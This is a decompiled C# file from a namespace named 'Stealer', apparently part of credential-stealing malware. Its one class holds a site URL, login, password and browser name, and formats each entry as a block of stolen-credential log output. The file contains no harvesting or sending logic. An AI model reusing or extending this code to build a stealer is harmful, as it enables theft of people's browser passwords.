using System;

namespace Stealer
{
	// Token: 0x0200001A RID: 26
	public class LogPassData
	{
		// Token: 0x0600006F RID: 111 RVA: 0x000095C4 File Offset: 0x000077C4
		public override string ToString()
		{
			return string.Format("――――――――――――――――――――――――――――――――――――――――――――\r\nSite     | {0}\r\nLogin    | {1}\r\nPassword | {2}\r\nBrowser  | {3}\r\n", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000070 RID: 112 RVA: 0x0000960A File Offset: 0x0000780A
		// (set) Token: 0x06000071 RID: 113 RVA: 0x00009612 File Offset: 0x00007812
		public string Login { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000072 RID: 114 RVA: 0x0000961B File Offset: 0x0000781B
		// (set) Token: 0x06000073 RID: 115 RVA: 0x00009623 File Offset: 0x00007823
		public string Password { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000074 RID: 116 RVA: 0x0000962C File Offset: 0x0000782C
		// (set) Token: 0x06000075 RID: 117 RVA: 0x00009634 File Offset: 0x00007834
		public string Program { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000076 RID: 118 RVA: 0x0000963D File Offset: 0x0000783D
		// (set) Token: 0x06000077 RID: 119 RVA: 0x00009645 File Offset: 0x00007845
		public string Url { get; set; }
	}
}
